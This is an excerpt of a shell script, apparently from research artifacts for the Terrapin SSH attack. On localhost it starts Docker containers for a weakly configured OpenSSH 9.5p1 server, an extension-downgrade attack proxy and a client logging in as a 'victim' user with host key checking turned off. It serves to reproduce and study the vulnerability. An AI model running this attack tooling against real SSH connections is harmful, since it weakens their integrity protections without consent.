...
docker run -d \
  ...
  terrapin-artifacts/openssh-server:9.5p1 -d -p 2222 -o Ciphers=aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com > /dev/null 2>&1
...
docker run -d \
  ...
  terrapin-artifacts/ext-downgrade-cbc-unknown --server-ip 127.0.0.1 --server-port 2222 > /dev/null 2>&1

echo "[+] Connecting with OpenSSH 9.5p1 client to 127.0.0.1:22 as user victim"
docker run \
  --network host \
  --name terrapin-artifacts-client \
  terrapin-artifacts/openssh-client:9.5p1 -vvv -o StrictHostKeyChecking=no -o Ciphers=aes128-cbc -o MACs=hmac-sha2-256-etm@openssh.com victim@127.0.0.1 > /dev/null 2>&1
